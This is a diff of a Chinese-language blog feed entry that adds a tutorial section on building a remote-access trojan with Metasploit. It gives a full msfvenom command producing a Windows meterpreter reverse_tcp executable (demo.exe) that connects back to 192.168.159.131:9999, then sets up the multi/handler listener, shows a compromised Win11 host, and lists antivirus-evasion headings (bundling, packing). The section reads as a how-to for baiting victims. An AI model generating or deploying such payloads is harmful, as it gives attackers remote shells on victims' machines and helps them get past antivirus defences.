@@ -40,6 +40,22 @@
 &lt;p&gt;比如输入 shell&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231227221523.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
 &lt;p&gt;键入 help 也可查看相关操作&lt;/p&gt;
+&lt;h5 id=&#34;msf生成远控木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf生成远控木马&#34;&gt;#&lt;/a&gt; msf 生成远控木马&lt;/h5&gt;
+&lt;p&gt;利用 msfveno 模块来生成远控&lt;/p&gt;
+&lt;p&gt;-p payload windows/x64/meterpreter/reverse_tcp 为系统 / 架构 / 作用 / 方式 后变为 payload 设置，-f 格式 -o 输出形式&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; windows/x64/meterpreter/reverse_tcp &lt;span class=&#34;token assign-left variable&#34;&gt;lhost&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.159.131 &lt;span class=&#34;token assign-left variable&#34;&gt;lport&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;9999&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; exe &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; demo.exe&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h5 id=&#34;设置鱼钩监听&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#设置鱼钩监听&#34;&gt;#&lt;/a&gt; 设置鱼钩（监听）&lt;/h5&gt;
+&lt;p&gt;使用 handler 模块&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit/multi/handler&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;配置 options&lt;/p&gt;
+&lt;p&gt;要求 payload，lhost,lport 与木马一致&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231229153040.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;完成后即可等待鱼儿上钩&lt;/p&gt;
+&lt;p&gt;如下图，我进入了一台 WIN11 系统主机&lt;/p&gt;
+&lt;p&gt;并且建立了一个 Hello.txt&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231229160542.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
+&lt;p&gt;其他&lt;s&gt;骚操作&lt;/s&gt;可自行 help 查看&lt;/p&gt;
+&lt;h5 id=&#34;免杀持续更新检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#免杀持续更新检测&#34;&gt;#&lt;/a&gt; 免杀（持续更新检测）&lt;/h5&gt;
+&lt;p&gt;捆绑&lt;/p&gt;
+&lt;p&gt;装壳&lt;/p&gt;
  ]]></description>
         </item>
         <item>
